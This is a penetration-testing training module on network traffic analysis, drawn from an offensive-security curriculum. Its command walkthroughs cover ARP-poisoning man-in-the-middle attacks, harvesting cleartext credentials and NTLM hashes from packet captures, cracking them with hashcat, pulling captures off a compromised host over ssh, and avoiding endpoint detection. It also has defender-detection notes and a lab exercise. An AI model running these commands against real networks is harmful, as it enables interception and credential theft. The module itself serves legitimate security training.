# Traffic Analysis

**Roadmap:** Phase 2: Offensive Core → Part 4: Footprinting and Reconnaissance → Stage 4: Advanced Fingerprinting & Logic Analysis

# Section 1 — What it is and where it sits

Traffic analysis is the examination of network packet captures to extract authentication credentials, session tokens, encryption weaknesses, protocol behavior, and internal network topology — when a vantage position on the network has been gained. It is a passive technique at the collection stage (capturing packets generates no attack traffic) but requires an active network position: ARP poisoning on a LAN segment, a compromised switch/router, a promiscuous-mode interface on a shared medium, or a VPN/tunnel providing internal visibility.

The intelligence produced: cleartext credentials (HTTP, FTP, Telnet, LDAP, SNMP), session cookies, internal IP addresses from non-public traffic, authentication protocol characteristics (NTLM vs Kerberos), encrypted traffic fingerprints (JA3), and application behavior patterns visible in packet timings.

```text
Stage 4 — Traffic Analysis
────────────────────────────────────────────────────────────────────
Network vantage gained   →   [Traffic Analysis]   →   Credential harvest
(ARP poison / SPAN port)      ↑ YOU ARE HERE           protocol intel
(VPN / compromised switch)    Wireshark / tcpdump       topology mapping
                              tshark / Zeek              JA3 fingerprint
────────────────────────────────────────────────────────────────────
```

---

# Section 2 — How attackers actually use this

## 2.1 Interface selection and capture positioning

Before capturing, the right interface must be selected. On a Kali VM with multiple network adapters, `eth0` may be the NAT adapter while `eth1` is the host-only adapter connected to the target network. Capturing on the wrong interface produces no target traffic.

```bash
# List available interfaces
$ ip link show
1: lo:      LOOPBACK
2: eth0:    UP   192.168.1.100/24   ← home network (NAT)
3: eth1:    UP   10.10.10.100/24    ← VPN / target network
4: tun0:    UP   10.8.0.5/24       ← OpenVPN tunnel

# Check which interface has target traffic
$ ip route show
default via 192.168.1.1 dev eth0
10.10.10.0/24 via 10.10.10.1 dev eth1
10.8.0.0/24 dev tun0

# Capture on the correct interface
$ sudo tcpdump -i eth1 -w capture.pcap
$ sudo tcpdump -i tun0 -w vpn_capture.pcap

# Wireshark interface selection (GUI)
# Capture → Interfaces → select the interface with traffic volume shown
```

**Promiscuous mode:** By default, a network interface discards packets not addressed to it. Promiscuous mode makes the interface process all packets on the segment — necessary for sniffing traffic not directed to your MAC. In a switched environment, promiscuous mode alone is not sufficient — you also need to position yourself on the path (ARP poisoning or SPAN port mirror).

## 2.2 Wireshark capture vs display filters

Wireshark uses two distinct filter syntaxes that are frequently confused:

- **Capture filters (BPF syntax):** Applied at capture time — packets not matching are not captured. Efficient, reduces pcap size. Used with `-f` in tcpdump.
- **Display filters (Wireshark syntax):** Applied to already-captured packets — hides non-matching packets from view but keeps them in the pcap. More expressive, supports protocol field access.

```bash
# Capture filters (BPF) — passed to tcpdump or Wireshark Capture Options
$ sudo tcpdump -i eth1 -w cap.pcap "port 80 or port 443"
$ sudo tcpdump -i eth1 -w cap.pcap "host 203.0.113.45"
$ sudo tcpdump -i eth1 -w cap.pcap "not port 22"           # exclude SSH
$ sudo tcpdump -i eth1 -w cap.pcap "tcp and not port 443"  # TCP excluding HTTPS
$ sudo tcpdump -i eth1 -w cap.pcap "net 10.10.0.0/24"      # internal subnet

# Display filters (Wireshark syntax) — used in Wireshark filter bar or tshark -Y
$ tshark -r cap.pcap -Y "http"                         # all HTTP traffic
$ tshark -r cap.pcap -Y "http.request.method == POST"  # POST requests only
$ tshark -r cap.pcap -Y "http contains 'password'"     # packets containing password
$ tshark -r cap.pcap -Y "ftp-data"                     # FTP data transfer
$ tshark -r cap.pcap -Y "smtp"                         # SMTP mail traffic
$ tshark -r cap.pcap -Y "ldap"                         # LDAP queries
$ tshark -r cap.pcap -Y "dns.flags.response == 1"      # DNS responses only
$ tshark -r cap.pcap -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0"  # SYN packets
$ tshark -r cap.pcap -Y "kerberos"                     # Kerberos auth traffic
$ tshark -r cap.pcap -Y "ntlmssp"                      # NTLM auth traffic
```

## 2.3 Extracting cleartext credentials

Cleartext credential extraction from pcap is the highest-immediate-value activity. Protocols that still transmit credentials in cleartext:

```bash
# HTTP Basic Authentication (base64-encoded but not encrypted)
$ tshark -r cap.pcap -Y "http.authorization" \
  -T fields -e ip.src -e http.authorization

203.0.113.100  Basic YWRtaW46cGFzc3dvcmQxMjM=

$ echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
admin:password123    ← cleartext credentials recovered

# HTTP POST bodies with form data (login forms)
$ tshark -r cap.pcap -Y "http.request.method == POST" \
  -T fields -e ip.src -e ip.dst -e http.file_data

203.0.113.100  203.0.113.45  username=admin&password=Sup3rS3cret!

# FTP credentials (always cleartext in FTP v1)
$ tshark -r cap.pcap -Y "ftp" \
  -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

203.0.113.50  USER  ftpuser
203.0.113.50  PASS  ftppassword123   ← plaintext FTP password

# Telnet session (entire session is cleartext)
$ tshark -r cap.pcap -Y "telnet" \
  -T fields -e ip.src -e telnet.data | tr -d '\n'

# SMTP AUTH (often unencrypted SMTP over port 25)
$ tshark -r cap.pcap -Y "smtp" \
  -T fields -e smtp.req.parameter | grep -A 1 "AUTH"

# SNMP community strings (SNMPv1/v2c)
$ tshark -r cap.pcap -Y "snmp" \
  -T fields -e ip.src -e snmp.community
203.0.113.60  public     ← default community string
203.0.113.60  m0n1tor1ng ← custom community string — harvest this

# LDAP bind credentials (non-LDAPS port 389)
$ tshark -r cap.pcap -Y "ldap.bindRequest" \
  -T fields -e ip.src -e ldap.name -e ldap.authentication.simple
203.0.113.70  CN=svc_ldap,DC=corp,DC=target  LdapServicePass1!
```

## 2.4 TLS handshake analysis and decryption

TLS traffic cannot be read directly, but the handshake is visible in plaintext and reveals:

```bash
# Extract TLS ClientHello details
$ tshark -r cap.pcap -Y "tls.handshake.type == 1" \
  -T fields -e ip.src -e tls.handshake.version -e tls.handshake.ciphersuite \
  -e tls.handshake.extensions_server_name

# Server Name Indication (SNI) — reveals which hostname is being connected to
# Even in encrypted HTTPS traffic, SNI is plaintext in ClientHello:
203.0.113.100  TLS 1.3  4865  api-internal.corp-target.com   ← internal API hostname

# Decrypt TLS traffic using pre-master secret log (requires browser/app cooperation)
# Set environment variable in browser/application to log TLS keys:
$ export SSLKEYLOGFILE=/tmp/ssl_keys.log
$ chromium &   # or firefox with SSLKEYLOGFILE

# Load pcap + key log in Wireshark:
# Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename
# → Point to /tmp/ssl_keys.log → now TLS traffic is decrypted

# Or using tshark:
$ tshark -r encrypted.pcap -o "tls.keylog_file:/tmp/ssl_keys.log" \
  -Y "http2" -T fields -e http2.headers.authorization

# Extract JA3 from ClientHello (requires zeek or tshark with ja3 plugin)
$ tshark -r cap.pcap -Y "tls.handshake.type == 1" \
  -T fields -e tls.handshake.ja3
```

## 2.5 NTLM and Kerberos authentication capture

Windows environments use NTLM or Kerberos for authentication. Both are visible in packet captures and NTLM hashes are offline-crackable.

```bash
# Identify NTLM authentication traffic
$ tshark -r cap.pcap -Y "ntlmssp.auth.username" \
  -T fields -e ip.src -e ntlmssp.auth.domain -e ntlmssp.auth.username
203.0.113.100  CORP  jsmith    ← username visible in NTLM Type 3

# Extract NTLM hash for offline cracking (NTLMv2)
# ntlmv2 hash = username::domain:challenge:response
$ tshark -r cap.pcap -Y "ntlmssp" \
  -T fields -e ntlmssp.auth.username -e ntlmssp.challenge -e ntlmssp.auth.ntresponse \
  | head -5

# Or use: python3 ntlm-extractor.py -p cap.pcap
# Format for hashcat:
jsmith::CORP:abcdef1234567890:aabbccdd...:0101000000000000...

# Crack with hashcat mode 5600 (NTLMv2)
$ hashcat -m 5600 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberos — identify TGT requests (AS-REQ)
$ tshark -r cap.pcap -Y "kerberos.CNameString" \
  -T fields -e ip.src -e kerberos.CNameString -e kerberos.realm

203.0.113.100  jsmith  CORP.TARGET.COM   ← Kerberos AS-REQ (user requesting TGT)

# Kerberoastable service tickets — identify TGS-REP responses
$ tshark -r cap.pcap -Y "kerberos.TGS-REP" \
  -T fields -e kerberos.SNameString -e kerberos.cipher
```

## 2.6 Exporting files from packet captures

Files transferred over cleartext protocols (HTTP, FTP, SMB without signing) can be reconstructed from packet captures:

```bash
# Wireshark GUI: File → Export Objects → HTTP/SMB/FTP
# Exports all transferred files to a directory

# tshark: extract HTTP objects
$ tshark -r cap.pcap --export-objects "http,/tmp/http_exports/"
ls /tmp/http_exports/
document.pdf    db_backup.sql    config.zip    screenshot.png

# SMB file extraction (requires smb-dissector)
$ tshark -r cap.pcap --export-objects "smb,/tmp/smb_exports/"

# Reconstruct FTP file transfers manually
$ tshark -r cap.pcap -Y "ftp-data" -T fields -e data \
  | xxd -r -p > reconstructed_file.bin

# Identify MIME type of extracted file
$ file /tmp/http_exports/document
/tmp/http_exports/document: PDF document, version 1.4
```

## 2.7 tcpdump for headless/remote capture

In many scenarios (compromised server, VPS, pivot host), Wireshark GUI is unavailable. `tcpdump` captures to pcap files for offline analysis:

```bash
# Capture on remote host, transfer locally for analysis
$ ssh user@compromised-host "sudo tcpdump -i eth0 -w - -c 10000 2>/dev/null" \
  > remote_capture.pcap

# Time-limited capture (capture for 60 seconds)
$ sudo tcpdump -i eth0 -G 60 -W 1 -w capture_%Y%m%d_%H%M%S.pcap

# Size-limited capture (rotate at 100MB)
$ sudo tcpdump -i eth0 -C 100 -w capture.pcap

# Capture and filter on the fly (show credentials in terminal)
$ sudo tcpdump -i eth0 -A -s 0 'tcp port 80 or tcp port 21' \
  | grep -iE "password|pass|login|user|auth" --color

# Capture specific protocol
$ sudo tcpdump -i eth0 port 161 -w snmp_traffic.pcap   # SNMP
$ sudo tcpdump -i eth0 port 389 -w ldap_traffic.pcap   # LDAP
$ sudo tcpdump -i eth0 port 25  -w smtp_traffic.pcap   # SMTP
```

## 2.8 Network topology mapping from traffic analysis

Packet captures reveal internal network topology that is invisible from external scanning:

```bash
# Extract all unique IP pairs communicating
$ tshark -r cap.pcap -T fields -e ip.src -e ip.dst \
  | sort -u | awk '{print $1, "→", $2}'

# Find internal IPs (RFC1918) communicating — reveals internal topology
$ tshark -r cap.pcap -Y "ip.src matches \"^10\\.|^192\\.168\\.|^172\\.(1[6-9]|2[0-9]|3[01])\\.\"" \
  -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -rn | head -20

# DNS queries — map all internal hostnames being resolved
$ tshark -r cap.pcap -Y "dns.flags.response == 0" \
  -T fields -e ip.src -e dns.qry.name | sort -u | grep -v "^$"

10.10.0.10  dc01.corp.target.com          ← domain controller
10.10.0.20  fileserver.corp.target.com    ← file server
10.10.0.30  jenkins.corp.target.com       ← CI/CD server
10.10.0.50  splunk.corp.target.com        ← SIEM server (from DNS)

# Identify high-traffic hosts (servers)
$ tshark -r cap.pcap -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10
3420  10.10.0.10   ← DC01 — domain controller (most traffic)
1891  10.10.0.50   ← Splunk
1234  10.10.0.20   ← File server
```

## 2.9 ARP poisoning to gain MitM capture position

On a switched network, promiscuous mode alone only captures broadcast and multicast traffic — unicast traffic between two other hosts is switched directly and never reaches your NIC. To capture traffic between target hosts, you must position yourself in the path using ARP poisoning.

```bash
# ARP poisoning with arpspoof (dsniff package)
$ sudo apt install dsniff

# Enable IP forwarding (so traffic is relayed, not dropped)
$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Poison the ARP cache of BOTH hosts simultaneously (two terminals)
# Tell 10.10.0.100 (victim) that the gateway (10.10.0.1) is at our MAC:
$ sudo arpspoof -i eth0 -t 10.10.0.100 10.10.0.1

# Tell the gateway (10.10.0.1) that 10.10.0.100 is at our MAC:
$ sudo arpspoof -i eth0 -t 10.10.0.1 10.10.0.100

# Traffic between victim and gateway now flows through us
# Capture the forwarded traffic:
$ sudo tcpdump -i eth0 host 10.10.0.100 -w victim_traffic.pcap

# ARP poisoning with ettercap (includes capture + filter in one tool)
$ sudo ettercap -T -q -i eth0 -M arp:remote /10.10.0.100// /10.10.0.1// \
  -w victim_traffic.pcap

# ARP poisoning with Bettercap (modern, feature-rich)
$ sudo bettercap -iface eth0
# In bettercap console:
net.probe on
set arp.spoof.targets 10.10.0.100
arp.spoof on
net.sniff on
```

**Operational cautions:**
- ARP poisoning generates an extremely high volume of ARP packets visible to all hosts
- IDS systems detect ARP poisoning within seconds on monitored segments
- If the victim host has `arpwatch` or `XArp` running, the admin is alerted immediately
- If IP forwarding is NOT enabled, the victim loses network connectivity — immediately obvious

## 2.10 Zeek for automated protocol intelligence extraction

Zeek (formerly Bro) is a network analysis framework that processes packet captures and generates structured log files for each protocol — HTTP logs, DNS logs, SSL logs, connection logs, file extraction logs. It is significantly more efficient than manual tshark analysis for bulk capture files.

```bash
# Install Zeek
$ sudo apt install zeek

# Process a packet capture
$ zeek -r capture.pcap

# Generated log files (in current directory):
# conn.log     — all TCP/UDP/ICMP connections (src, dst, port, bytes, duration)
# http.log     — HTTP requests (URI, method, user-agent, host, response code, body)
# dns.log      — DNS queries and responses (qtype, query, answer)
# ssl.log      — TLS connections (version, cipher, cert subject, JA3 hash)
# files.log    — transferred files (MIME type, MD5/SHA1/SHA256, source host)
# x509.log     — certificate details (subject, issuer, SAN, expiry)
# weird.log    — protocol anomalies flagged by Zeek

# Parse HTTP log for POST requests containing credentials
$ cat http.log | zeek-cut method uri post_body username password \
  | grep "POST" | head -20

# Parse DNS log for all unique hostnames resolved
$ cat dns.log | zeek-cut query | sort -u | grep -v "^-$" | head -40

# Parse SSL log for JA3 hashes and server cert subjects
$ cat ssl.log | zeek-cut server_name ja3 ja3s subject | head -20

# Extract all transferred files with their hashes
$ cat files.log | zeek-cut source mime_type md5 sha256 filename \
  | grep -v "^-" | head -20

# Parse conn.log for high-volume connections (data exfil indicator)
$ cat conn.log | zeek-cut id.orig_h id.resp_h resp_bytes \
  | awk '$3 > 1000000 {print $0}' | sort -k3 -rn | head -10
# → Connections transferring >1MB of data — potential exfil or large file transfer
```

Zeek converts a raw pcap into a structured intelligence database in seconds. What would take hours of manual tshark filtering is summarized in structured TSV log files that are grepped in seconds.

---

# Section 3 — Core concepts and terminology

| Term | Definition |
|------|-----------|
| **Promiscuous mode** | NIC mode where all packets on the segment are processed, not just those addressed to the local MAC |
| **SPAN port (port mirror)** | Switch feature that mirrors all traffic from one or more ports to a monitoring port |
| **BPF (Berkeley Packet Filter)** | Low-level filter syntax used by tcpdump and Wireshark capture filters |
| **Display filter** | Wireshark/tshark filter applied to already-captured packets; uses Wireshark-specific syntax |
| **Capture filter** | BPF filter applied at capture time; packets not matching are discarded |
| **NTLMv2 hash** | Challenge-response authentication hash crackable offline; format: `user::domain:challenge:response` |
| **SNI (Server Name Indication)** | TLS extension in ClientHello revealing the target hostname — visible even in encrypted traffic |
| **Pre-master secret log** | File recording TLS session keys; enables Wireshark to decrypt captured TLS sessions |
| **JA3** | MD5 hash of TLS ClientHello fields for client fingerprinting |
| **ARP poisoning** | Sending forged ARP replies to redirect victim traffic through the attacker's machine |
| **tcpdump** | Command-line packet capture tool; writes to pcap format for offline analysis |
| **tshark** | Command-line version of Wireshark; reads pcap files and applies display filters |
| **Zeek (Bro)** | Network analysis framework for extracting structured data from packet captures |
| **Export Objects** | Wireshark feature to reconstruct and export files transferred over HTTP, SMB, FTP |
| **HTTP Basic Auth** | Authentication scheme encoding credentials as `base64(user:password)` in the Authorization header |

---

# Section 4 — Tools and commands

| Tool | Command | What it finds | When to use |
|------|---------|--------------|------------|
| `tcpdump` | `tcpdump -i eth1 -w cap.pcap` | All traffic to file | Remote/headless capture |
| `tshark` | `tshark -r cap.pcap -Y "http.authorization"` | Cleartext creds | Post-capture analysis |
| `tshark` | `tshark -r cap.pcap -Y "ntlmssp.auth.username"` | NTLM usernames | Windows auth capture |
| `tshark` | `tshark -r cap.pcap --export-objects "http,/tmp/"` | Transferred files | HTTP file extraction |
| `wireshark` | File → Export Objects → HTTP | Files from HTTP | GUI file extraction |
| `hashcat` | `hashcat -m 5600 hashes.txt rockyou.txt` | NTLMv2 crack | Post-capture offline |

---

# Section 5 — Defender detection

- **Promiscuous mode detection:** Some network intrusion detection systems detect hosts in promiscuous mode by sending forged ARP packets or ICMP probes to non-existent MAC addresses and observing which hosts respond — they should not, unless in promiscuous mode. This is not commonly deployed but exists in advanced defensive configurations.
- **ARP poisoning detection:** ARP poisoning is highly visible. ARP watches (like `arpwatch`) alert when an IP's MAC address changes. Modern switches support Dynamic ARP Inspection (DAI) which blocks unsolicited ARP replies. Active network monitoring catches ARP poisoning within seconds.
- **Packet capture on a switch:** Modern switches do not forward all traffic to all ports. Without a SPAN port or ARP poisoning, a host on a switched network only sees traffic directly addressed to it. The switch itself will log when SPAN port mirroring is configured — requiring access to switch management.
- **TLS traffic analysis (passive):** Capturing TLS-encrypted traffic is undetectable — no packets are sent. The encrypted session data captured is not useful without the pre-master secret log or private key.
- **tcpdump on a compromised host:** Process monitoring (EDR) may alert on `tcpdump` or `tshark` execution on an endpoint — these are not normal end-user applications. Use pre-installed packet capture capabilities or PCAP kernel-level capture APIs instead.

---

# Section 6 — Lab task

**Platform:** Kali Linux with Wireshark. TryHackMe "Wireshark 101" or "Network Security" rooms. Alternatively: set up Metasploitable2 on same LAN and capture its traffic.

**Objective:** Capture traffic, extract credentials from cleartext protocols, identify NTLM authentication, and map internal hosts from DNS queries.

**Steps:**

1. **Interface selection:** `ip link show` — identify which interface carries target traffic
2. **Start capture:** `sudo tcpdump -i eth1 -w lab_capture.pcap` — run for 2 minutes with target activity
3. **HTTP credential extraction:** `tshark -r lab_capture.pcap -Y "http.authorization" -T fields -e ip.src -e http.authorization`
4. **HTTP POST form data:** `tshark -r lab_capture.pcap -Y "http.request.method == POST" -T fields -e ip.src -e http.file_data`
5. **FTP credential extraction:** `tshark -r lab_capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg | grep -iE "USER|PASS"`
6. **NTLM hash extraction:** `tshark -r lab_capture.pcap -Y "ntlmssp.auth.username" -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain`
7. **DNS-based topology mapping:** `tshark -r lab_capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u`
8. **File export:** `tshark -r lab_capture.pcap --export-objects "http,/tmp/http_files/"` — list exported files
9. **TLS SNI extraction:** `tshark -r lab_capture.pcap -Y "tls.handshake.type == 1" -T fields -e tls.handshake.extensions_server_name | sort -u`
10. **Compile `traffic_analysis.md`:** Credentials found | Protocols | Internal hosts from DNS | Transferred files | NTLM hashes | Topology map

```bash
git commit -m "recon(stage4): traffic analysis — credentials and topology from pcap for <target>"
```

---

# Section 7 — Common mistakes

**1. Capturing on the wrong interface**
_Why it matters:_ A Wireshark or tcpdump capture on eth0 (NAT adapter) captures your own internet traffic, not the target network.
_Fix:_ Always verify the interface with `ip route show` before starting capture. Identify which interface has the route to the target network.

**2. Not using capture filters for large captures**
_Why it matters:_ Capturing all traffic on a busy network generates pcap files of dozens of gigabytes per hour. Opening a 50GB pcap in Wireshark is impractical.
_Fix:_ Use BPF capture filters to capture only relevant protocols: `tcpdump -i eth1 -w cap.pcap "port 80 or port 21 or port 389 or port 25"`.

**3. Forgetting that display filters don't reduce pcap size**
_Why it matters:_ Applying a display filter in Wireshark hides packets from view but they remain in the pcap file. Saving a "filtered" pcap with Wireshark does save only filtered packets (if using Save As), but `tshark -r file -Y filter` produces filtered output without modifying the file.
_Fix:_ Use `tshark -r cap.pcap -Y "filter" -w filtered.pcap` to create a new pcap containing only matching packets.

**4. Missing NTLM hashes by not filtering the full NTLM exchange**
_Why it matters:_ NTLM authentication is a 3-message exchange (Type 1, Type 2, Type 3). The crackable NTLMv2 hash is in Type 3 but requires the challenge from Type 2 to reconstruct. Capturing only Type 3 without Type 2 produces incomplete hashes.
_Fix:_ Use `tshark -Y "ntlmssp"` (no restriction to specific type) to capture all three NTLM messages. Tools like Responder automatically assemble the complete hash.

**5. Attempting to decrypt TLS without the pre-master secret log**
_Why it matters:_ Without the TLS session keys (pre-master secret log or server private key), TLS traffic is cryptographically opaque. Operators who expect to read HTTPS traffic from a raw pcap are disappointed.
_Fix:_ TLS decryption requires either: (1) pre-master secret log from the client/server, (2) the server's private key (only works for non-PFS cipher suites), or (3) an SSL inspection proxy on the path.

---

# Section 8 — Move-on gate

1. You capture traffic on a shared network segment. `tshark -Y "http.authorization"` returns: `203.0.113.100  Basic YWRtaW46UEBzc3cwcmQh`. Without notes, state what protocol this is, decode the credential, and explain why HTTP Basic Authentication is cleartext even though the value appears encoded.

2. `tshark -Y "ntlmssp.auth.username"` reveals `jsmith::CORP:abc123:def456:...`. Without notes, state: what attack technique produced this capture, what tool you use to crack it, which hashcat mode applies, and what the cracked password enables you to do.

3. You have a 60-second packet capture from a VPN-connected internal segment. DNS queries in the capture include: `dc01.corp.local`, `fileserver.corp.local`, `splunk.corp.local`. Without notes, describe what each hostname implies about the internal network architecture, and which host you would prioritize attacking and why.
